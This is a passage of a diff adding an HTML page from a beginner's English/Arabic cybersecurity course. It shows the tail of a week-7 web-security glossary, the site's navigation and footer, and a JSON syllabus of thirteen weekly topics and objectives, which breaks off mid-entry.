+<td>تمنع الجافاسكربت من قراءة الكوكي</td>
+</tr>
+<tr>
+<td>SameSite</td>
+<td>—</td>
+<td>تمنع إرسال الكوكي في طلبات عابرة للمواقع</td>
+</tr>
+<tr>
+<td>Same-Origin Policy</td>
+<td>سياسة الأصل الواحد</td>
+<td>حدود أمان المتصفح</td>
+</tr>
+<tr>
+<td>CORS</td>
+<td>مشاركة الموارد عبر الأصول</td>
+<td>استثناء منظّم من نفس السياسة</td>
+</tr>
+<tr>
+<td>Proxy</td>
+<td>الوسيط</td>
+<td>برنامج يمر عبره الترافيك ويستطيع تعديله</td>
+</tr>
+<tr>
+<td>XSS</td>
+<td>البرمجة عبر المواقع</td>
+<td>حقن جافاسكربت في صفحة</td>
+</tr>
+<tr>
+<td>CSRF</td>
+<td>تزوير الطلب عبر المواقع</td>
+<td>إجبار متصفحك على إرسال طلب غير مرغوب</td>
+</tr>
+</tbody>
+</table></div></div></div>
+</details>
+</div>
+<nav class="weeknav"><a class="prev" href="week-06.html"><span class="dir"><span class="only-en">← Previous</span><span class="only-ar">→ السابق</span></span><span class="ttl"><span class="only-en">Networking III: TLS, Firewalls, NAT + Nmap</span><span class="only-ar" dir="rtl" lang="ar">الشبكات ٣: TLS والجدران النارية وNAT مع Nmap</span></span></a><a class="next" href="week-08.html"><span class="dir"><span class="only-en">Next →</span><span class="only-ar">← التالي</span></span><span class="ttl"><span class="only-en">Web II: Architecture, Databases, APIs + OWASP Top 10</span><span class="only-ar" dir="rtl" lang="ar">الويب ٢: المعمارية وقواعد البيانات وواجهات API مع OWASP Top 10</span></span></a></nav>
+</div>
+</main>
+<footer class="site-foot">
+  <div class="foot-in">
+    <div class="foot-brand">
+      <a class="brand" href="index.html">
+        <span class="brand-mark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v6c0 4.5-3 7.6-7 9-4-1.4-7-4.5-7-9V6l7-3z"/><path d="M9.2 12.2l2 2 3.6-4"/></svg></span>
+        <span class="brand-text">
+          <span class="brand-name">Pre Cybersecurity</span>
+          <span class="brand-ver">v0.1</span>
+        </span>
+      </a>
+      <p><span class="only-en">Learn cybersecurity from zero — one step at a time.</span><span class="only-ar" dir="rtl" lang="ar">تعلّم الأمن السيبراني من الصفر — خطوة بخطوة.</span></p>
+    </div>
+    <div class="foot-cols">
+      <div class="foot-col">
+        <h3><span class="only-en">Learn</span><span class="only-ar">التعلّم</span></h3>
+        <ul>
+          <li><a href="learn.html"><span class="only-en">All courses</span><span class="only-ar">كل المسارات</span></a></li>
+          <li><a href="path.html"><span class="only-en">Learning path</span><span class="only-ar">مسار التعلّم</span></a></li>
+          <li><a href="practice.html"><span class="only-en">Practice</span><span class="only-ar">التدريب</span></a></li>
+          <li><a href="progress.html"><span class="only-en">My progress</span><span class="only-ar">تقدّمي</span></a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h3><span class="only-en">Reference</span><span class="only-ar">مراجع</span></h3>
+        <ul>
+          <li><a href="glossary.html"><span class="only-en">Glossary</span><span class="only-ar">القاموس</span></a></li>
+          <li><a href="resources.html"><span class="only-en">Resources</span><span class="only-ar">المصادر</span></a></li>
+          <li><a href="specializations.html"><span class="only-en">What comes next</span><span class="only-ar">ما بعد ذلك</span></a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <div class="foot-base">
+    <span><span class="only-en">Pre Cybersecurity v0.1 · 13 weeks · free tooling</span><span class="only-ar" dir="rtl" lang="ar">Pre Cybersecurity v0.1 · ١٣ أسبوعاً · أدوات مجانية</span></span>
+    <span><span class="only-en">English material · Arabic explanations</span><span class="only-ar" dir="rtl" lang="ar">المصادر بالإنجليزية · الشرح بالعربية</span></span>
+  </div>
+</footer>
+<nav class="mobnav" aria-label="Primary mobile">
+  <div class="mobnav-in">
+    <a href="index.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.5 12 3l9 7.5"/><path d="M5.5 9.5V20h13V9.5"/></svg><span class="only-en">Dashboard</span><span class="only-ar">لوحة التقدّم</span></a>
+    <a href="learn.html" aria-current="page"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2Z"/></svg><span class="only-en">Learn</span><span class="only-ar">التعلّم</span></a>
+    <a href="path.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="6" cy="19" r="2.5"/><circle cx="18" cy="5" r="2.5"/><path d="M8.5 19H14a3 3 0 0 0 0-6h-4a3 3 0 0 1 0-6h5.5"/></svg><span class="only-en">Learning Path</span><span class="only-ar">مسار التعلّم</span></a>
+    <a href="practice.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M9 3v6.5L4.2 18A2 2 0 0 0 6 21h12a2 2 0 0 0 1.8-3L15 9.5V3"/><path d="M8 3h8M7.5 14h9"/></svg><span class="only-en">Practice</span><span class="only-ar">التدريب</span></a>
+    <a href="progress.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 3v18h18"/><path d="M7 15l3.5-4 3 2.5L20 7"/></svg><span class="only-en">Progress</span><span class="only-ar">تقدّمي</span></a>
+  </div>
+</nav>
+<script id="pc-data" type="application/json">{"weeks": [{"n": 1, "en": "Terminal From Zero & Build Your Lab", "ar": "Terminal من الصفر وبناء مختبرك", "desc_en": "Start from absolute zero: learn what a terminal is, why almost all security work happens there, and build your own practice lab.", "desc_ar": "ابدأ من الصفر التام: تعلّم ما هو Terminal، ولماذا يحدث العمل الأمني كله تقريباً فيها، وابنِ مختبر تدريب خاصاً بك.", "stage": 1, "difficulty": "beginner", "load": "~18h", "prereq": null, "prereqKind": "", "url": "week-01.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Terminal", "Shell", "Kernel", "Linux", "Filesystem", "Directory"], "objectives": ["Explain what an operating system, a shell, and a filesystem are, in their own words", "Navigate the filesystem confidently: pwd, ls, cd, absolute vs relative paths", "Create, read, move, copy, and delete files and directories", "Use man and --help to teach themselves a command they've never seen", "Explain what a virtual machine is and why we use one instead of our real computer"]}, {"n": 2, "en": "Linux: Filesystem, Users, Permissions, Processes", "ar": "لينكس: نظام الملفات والمستخدمون والصلاحيات والعمليات", "desc_en": "Learn how Linux organises files and decides who may touch them — and why one wrong permission can hand over a whole system.", "desc_ar": "تعرّف على كيفية تنظيم Linux للملفات وتحديد من يحق له الوصول إليها — ولماذا خطأ صلاحيات واحد قد يسلّم النظام بالكامل.", "stage": 2, "difficulty": "beginner", "load": "~18h", "prereq": 1, "prereqKind": "gate", "url": "week-02.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Permissions", "Owner / Group / Other", "SUID", "Privilege Escalation", "Least Privilege", "Process ID (PID)"], "objectives": ["Explain the Linux permission model: owner / group / other, read / write / execute", "Read and set permissions in both symbolic (rwxr-xr-x) and numeric (755) notation", "Explain what chmod, chown, umask do and when each is used", "Create users and groups; explain why privilege separation matters", "Use sudo correctly and explain why running as root permanently is dangerous"]}, {"n": 3, "en": "Linux: Services, Logs, and Bash Scripting", "ar": "لينكس: الخدمات والسجلات وكتابة سكربتات Bash", "desc_en": "See what runs in the background, how logs record nearly everything, and how to automate repetitive work instead of repeating it.", "desc_ar": "اكتشف ما يعمل في الخلفية، وكيف تسجّل السجلات كل شيء تقريباً، وكيف تُؤتمت المهام المتكررة بدل تكرارها يدوياً.", "stage": 2, "difficulty": "beginner", "load": "~18h", "prereq": 2, "prereqKind": "checkpoint", "url": "week-03.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Service / Daemon", "systemd", "Log", "journalctl", "cron", "Persistence"], "objectives": ["Explain what a service (daemon) is and how systemd manages it", "Start, stop, enable, disable, and inspect services with systemctl", "Read and interpret journalctl output", "Locate and read the key log files in /var/log and explain what each records", "Write a Bash script with variables, conditionals, loops, and arguments"]}, {"n": 4, "en": "Networking I: Models, Addressing, How Packets Move", "ar": "الشبكات ١: النماذج والعنونة وكيف تتحرك الحزم", "desc_en": "Understand how computers find each other: addresses, ports, subnetting, and the layers that carry your data across a network.", "desc_ar": "افهم كيف تجد الحواسيب بعضها: العناوين والمنافذ وتقسيم الشبكات والطبقات التي تنقل بياناتك عبر الشبكة.", "stage": 3, "difficulty": "intermediate", "load": "~18h", "prereq": 3, "prereqKind": "checkpoint", "url": "week-04.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["OSI Model", "Encapsulation", "PDU", "Subnet Mask", "CIDR", "Broadcast"], "objectives": ["Name the 7 OSI layers and the 4 TCP/IP layers, and map each OSI layer to its TCP/IP equivalent", "Explain encapsulation: what header is added at each layer, and what a PDU is called at each layer", "Convert between decimal and binary octets by hand, without a calculator", "Identify the class, network, and host portion of any IPv4 address, and recognise RFC1918 private ranges", "Subnet a network by hand: given x.x.x.x/N, find the network address, broadcast, and usable host range"]}, {"n": 5, "en": "Networking II: TCP, Ports, DNS, DHCP + Wireshark", "ar": "الشبكات ٢: TCP والمنافذ وDNS وDHCP مع Wireshark", "desc_en": "Watch real network traffic: capture it, read it packet by packet, and see for yourself why unencrypted protocols are dangerous.", "desc_ar": "شاهد حركة الشبكة الحقيقية: التقطها، واقرأها حزمة بحزمة، واعرف بنفسك لماذا البروتوكولات غير المشفّرة خطرة.", "stage": 3, "difficulty": "intermediate", "load": "~18h", "prereq": 4, "prereqKind": "checkpoint", "url": "week-05.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Three-Way Handshake", "Sequence Number", "Flag", "RST", "Teardown", "Ephemeral Port"], "objectives": ["Describe the TCP three-way handshake and name the flag and sequence number in each packet", "Explain how TCP tears a connection down (FIN/ACK) and list the flags (SYN, ACK, FIN, RST, PSH, URG), saying what each signals", "Contrast TCP and UDP and choose correctly between them for a given use case", "State the port ranges (well-known / registered / dynamic) and name 15 well-known ports from memory", "Trace a DNS resolution: recursive vs iterative, and the role of each record type (A, AAAA, CNAME, MX, NS, TXT)"]}, {"n": 6, "en": "Networking III: TLS, Firewalls, NAT + Nmap", "ar": "الشبكات ٣: TLS والجدران النارية وNAT مع Nmap", "desc_en": "Learn how connections are encrypted and filtered, then scan a network the way a security professional does — and find your own scan in the logs.", "desc_ar": "تعلّم كيف تُشفَّر الاتصالات وتُفلتر، ثم امسح شبكة كما يفعل محترف الأمن — وابحث عن أثر مسحتك أنت في السجلات.", "stage": 3, "difficulty": "intermediate", "load": "~18h", "prereq": 5, "prereqKind": "checkpoint", "url": "week-06.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["TLS", "Certificate", "Certificate Authority (CA)", "Chain of Trust", "SNI", "Firewall"], "objectives": ["Explain what TLS protects and what it does not protect (hint: the endpoints are still endpoints)", "Describe the TLS handshake at a high level and explain the role of the certificate and the CA chain", "Inspect a live certificate with openssl s_client and read its subject, issuer, validity, and SANs", "Contrast stateless and stateful firewalls, and explain what connection tracking buys you", "Write, order, verify, and delete ufw rules, and read a firewall block in the logs"]}, {"n": 7, "en": "Web I: HTTP Deep, Cookies, Sessions, Browsers", "ar": "الويب ١: HTTP بعمق والكوكيز والجلسات والمتصفحات", "desc_en": "Follow a web request from your browser to the server: what HTTP sends, how cookies keep you logged in, and how accounts get hijacked.", "desc_ar": "تابع طلب الويب من متصفحك إلى الخادم: ماذا يرسل HTTP، وكيف تُبقيك الكوكيز مسجّلاً للدخول، وكيف تُختطف الحسابات.", "stage": 4, "difficulty": "intermediate", "load": "~18h", "prereq": 6, "prereqKind": "checkpoint", "url": "week-07.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Request / Response", "HTTP Header", "Method", "Status Code", "Stateless", "Cookie"], "objectives": ["Trace a complete HTTP request/response cycle and name every stage between the Enter key and the rendered page", "Use GET, POST, PUT, DELETE deliberately and explain when a server should use each", "Classify any status code by its class (1xx–5xx) and explain what the class means", "Read and explain the security-relevant request and response headers, including Host, User-Agent, Referer, Cookie, Set-Cookie, Authorization, Content-Type, and the CORS headers", "Explain why HTTP is stateless, and how cookies and sessions restore state on top of it"]}, {"n": 8, "en": "Web II: Architecture, Databases, APIs + OWASP Top 10", "ar": "الويب ٢: المعمارية وقواعد البيانات وواجهات API مع OWASP Top 10", "desc_en": "See how a real web application is put together, and where it breaks when the server trusts whatever the user sends. Meet the OWASP Top 10 as a map.", "desc_ar": "تعرّف على كيفية بناء تطبيق ويب حقيقي، وأين ينكسر حين يثق الخادم بكل ما يرسله المستخدم. وتتعرّف على OWASP Top 10 كخريطة.", "stage": 4, "difficulty": "intermediate", "load": "~18h", "prereq": 7, "prereqKind": "checkpoint", "url": "week-08.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Database", "SQL", "Query", "Injection", "SQL Injection", "Prepared Statement"], "objectives": ["Describe a three-tier web architecture and identify the trust boundary between each tier", "Write basic SQL: SELECT, INSERT, UPDATE, DELETE, with WHERE, ORDER BY, and a simple JOIN", "Explain how application code builds a query and sends it to a database", "Explain REST: endpoints, verbs, JSON, status codes, and how auth is carried in a header", "Name the OWASP Top 10 categories and place a given vulnerability into the right one"]}, {"n": 9, "en": "Security Core: Risk, Threat Modeling, Access Control", "ar": "أساسيات الأمن: المخاطر ونمذجة التهديدات والتحكم بالوصول", "desc_en": "Learn the words the profession runs on — threat, vulnerability, risk — and how to describe a problem precisely enough to fix it.", "desc_ar": "تعلّم الكلمات التي تقوم عليها المهنة — التهديد والثغرة والخطر — وكيف تصف مشكلة بدقة تكفي لحلّها.", "stage": 5, "difficulty": "intermediate", "load": "~18h", "prereq": 8, "prereqKind": "checkpoint", "url": "week-09.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Confidentiality", "Integrity", "Availability", "Authentication", "Authorization", "DAC / MAC / RBAC / ABAC"], "objectives": ["Explain the CIA triad and give a concrete, real failure of each of the three properties", "Distinguish authentication from authorization, and explain how conflating them produces breaches", "Compare the four access control models — DAC, MAC, RBAC, ABAC — and say when each is used", "Apply least privilege and separation of duties to a real scenario", "Define asset, threat, vulnerability, exploit, and risk — and never confuse them again"]}, {"n": 10, "en": "Applied Cryptography", "ar": "التشفير التطبيقي", "desc_en": "Untangle the three things beginners always confuse — hashing, encryption and encoding — and see why storing passwords badly ends companies.", "desc_ar": "افصل بين ثلاثة مفاهيم يخلط بينها المبتدئون دائماً — التجزئة والتشفير والترميز — واعرف لماذا يُسقط تخزين كلمات المرور بطريقة خاطئة شركات كاملة.", "stage": 5, "difficulty": "intermediate", "load": "~18h", "prereq": 9, "prereqKind": "checkpoint", "url": "week-10.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Encoding", "Hashing", "Encryption", "Plaintext / Ciphertext", "Symmetric / Asymmetric", "Public / Private Key"], "objectives": ["Distinguish hashing, encryption, and encoding — and say what each is actually for", "Explain why MD5 is broken, what \"broken\" precisely means, and why it still appears everywhere", "Explain salting, and demonstrate why an unsalted password hash is catastrophic", "Compare password storage done right (Argon2, scrypt, bcrypt) with done wrong (MD5, SHA-1, plain SHA-256)", "Explain symmetric encryption, and articulate the key distribution problem it creates"]}, {"n": 11, "en": "Defensive Taster: Hardening, Detection, Incident Response", "ar": "جولة دفاعية: التقوية والكشف والاستجابة للحوادث", "desc_en": "Play defence: lock down a system, collect its logs, then attack your own machine and detect yourself in a SIEM.", "desc_ar": "العب دور الدفاع: قوِّ نظاماً، واجمع سجلاته، ثم اهجم على جهازك أنت واكتشف هجومك في نظام SIEM.", "stage": 6, "difficulty": "intermediate", "load": "~18h", "prereq": 10, "prereqKind": "checkpoint", "url": "week-11.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Hardening", "Baseline", "Attack Surface", "CIS Benchmark", "Prevention / Detection / Response", "Log Aggregation"], "objectives": ["Explain system hardening and what a CIS Benchmark actually is", "Reduce attack surface on a real Ubuntu VM: services, ports, packages, config", "Explain why prevention alone always eventually fails, and what detection adds", "Explain what a log is, what log aggregation solves, and why central collection matters", "Describe what a SIEM is, what it correlates, and why it exists"]}, {"n": 12, "en": "Offensive Taster: Methodology, Recon, Exploitation, Reporting", "ar": "جولة هجومية: المنهجية والاستطلاع والاستغلال والتقارير", "desc_en": "Learn how a professional penetration test actually runs — authorization and scope first, then reconnaissance, then the report that is the real deliverable.", "desc_ar": "تعرّف على كيفية سير اختبار الاختراق المهني فعلاً — التصريح والنطاق أولاً، ثم الاستطلاع، ثم التقرير الذي هو المُنتَج الحقيقي.", "stage": 6, "difficulty": "advanced", "load": "~18h", "prereq": 11, "prereqKind": "checkpoint", "url": "week-12.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "legal", "en": "Legal & Authorization", "ar": "الجانب القانوني والتصريح", "hours": null, "counts": true}, {"key": "theory", "en": "Theory & Concepts", "ar": "النظرية والمفاهيم", "hours": 4.0, "counts": true}, {"key": "lab", "en": "Guided Lab", "ar": "المختبر الموجَّه", "hours": 7.0, "counts": true}, {"key": "challenge", "en": "Challenge", "ar": "التحدّي", "hours": 5.0, "counts": true}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Authorization", "Scope", "Rules of Engagement (RoE)", "Statement of Work (SoW)", "Penetration Test", "Vulnerability Assessment"], "objectives": ["Explain authorization, scope, and rules of engagement — and why all three are written, not spoken", "Distinguish a penetration test, a vulnerability assessment, a red team engagement, and a crime", "Describe the PTES phases and where OWASP WSTG fits for web applications", "Perform passive reconnaissance using only public sources", "Perform active enumeration against your own lab target"]}, {"n": 13, "en": "Capstone: Attack/Defend Exercise & Specialization Decision", "ar": "مشروع الختام: تمرين هجوم/دفاع وقرار التخصص", "desc_en": "Put it all together in a two-team exercise, then choose the direction you will specialise in — based on what you actually did, not what sounded impressive.", "desc_ar": "اجمع كل شيء في تمرين بفريقين، ثم اختر الاتجاه الذي ستتخصص فيه — بناءً على ما فعلته فعلاً، لا على ما بدا مثيراً.", "stage": 7, "difficulty": "advanced", "load": "~18h", "prereq": 12, "prereqKind": "checkpoint", "url": "week-13.html", "lessons": [{"key": "objectives", "en": "What you'll learn", "ar": "ما ستتعلّمه", "hours": null, "counts": false}, {"key": "brief", "en": "The Scenario", "ar": "سيناريو التمرين", "hours": null, "counts": false}, {"key": "legal", "en": "Legal & Authorization", "ar": "الجانب القانوني والتصريح", "hours": null, "counts": true}, {"key": "structure", "en": "Exercise Structure", "ar": "هيكل التمرين", "hours": null, "counts": true}, {"key": "rubric", "en": "How You'll Be Assessed", "ar": "كيف ستُقيَّم", "hours": null, "counts": false}, {"key": "deliverables", "en": "What You Must Deliver", "ar": "ما يجب أن تسلّمه", "hours": null, "counts": true}, {"key": "debrief", "en": "Structured Debrief", "ar": "المراجعة المنظّمة", "hours": null, "counts": false}, {"key": "payoff", "en": "Why this matters in security", "ar": "لماذا يهم هذا أمنياً", "hours": null, "counts": false}, {"key": "decision", "en": "Choosing Your Direction", "ar": "اختيار مسارك", "hours": null, "counts": false}, {"key": "checkpoint", "en": "Weekly Checkpoint", "ar": "نقطة التحقّق الأسبوعية", "hours": null, "counts": true}, {"key": "limits", "en": "What You Still Don't Know", "ar": "ما لا تعرفه بعد", "hours": null, "counts": false}, {"key": "notes", "en": "Concept Notes", "ar": "ملاحظات مفاهيمية موسّعة", "hours": null, "counts": false}, {"key": "terms", "en": "Terms of the Week", "ar": "مصطلحات الأسبوع", "hours": null, "counts": false}], "skills": ["Capstone", "Attack/Defend Exercise", "Red Team / Blue Team", "Purple Team", "White Cell", "Rules of Engagement"], "objectives": ["Plan and execute a team engagement under a written scope and rules of engagement", "Defend a live Ubuntu target: hardening, monitoring, triage, containment, and reporting", "Attack a live Ubuntu target: reconnaissance, enumeration, verified exploitation, and reporting", "Keep an accurate, timestamped operational log throughout an engagement", "Produce a professional incident report (defenders) or penetration test report (attackers)"]}], "stages": [{"n": 1, "en": "Start Here — Computer & Terminal Basics", "ar": "ابدأ من هنا — أساسيات الحاسوب و Terminal", 